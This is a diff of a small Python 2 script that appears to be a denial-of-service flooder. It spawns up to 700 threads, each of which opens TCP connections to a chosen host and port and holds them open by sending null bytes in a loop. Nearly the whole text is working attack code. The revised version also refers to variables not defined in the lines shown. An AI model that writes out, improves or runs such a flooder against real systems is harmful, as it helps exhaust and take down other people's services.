@@ -4,38 +4,25 @@ p=input("Port:\n>")
 global v
 v=0
 class xer(threading.Thread):
- def run (self):
-  h=v
-  l=[]
-  for x in range(10):
+ def run(self):
+  x=pointer
+  while True:
    try:
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((u,p))
-    print"[Connected to {}:{}]".format(u,p)
-    l.append(s)
+    s.settimeout(timeout)
+    s.connect((target,port))
+    print"[Connected to {}:{}]".format(target,port)
+    while True:
+     try:
+      s.send("\x00")
+      print"[{}: Voly sent]".format(x)
+     except Exception as e:
+      break
+     time.sleep(.2)
    except:
     pass
-  while True:
-   if len(l)==0:
-    print"\nNo more connections can be made"
-    break
-   else:
-    for z in range(10):
-     try:
-      s=l[z]
-      s.send("\0")
-      print"[Voly sent:{}]".format(h)
-      time.sleep(.3)
-     except:
-      l.remove(s)
-      try:
-       s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-       s.connect((u,p))
-       print"[Connected to {}:{}]".format(u,p)
-       l.append(s)
-      except:
-       pass
-for x in range(100):
+   time.sleep(.3)
+for x in range(700):
   v=x
   t=xer()
   t.start()
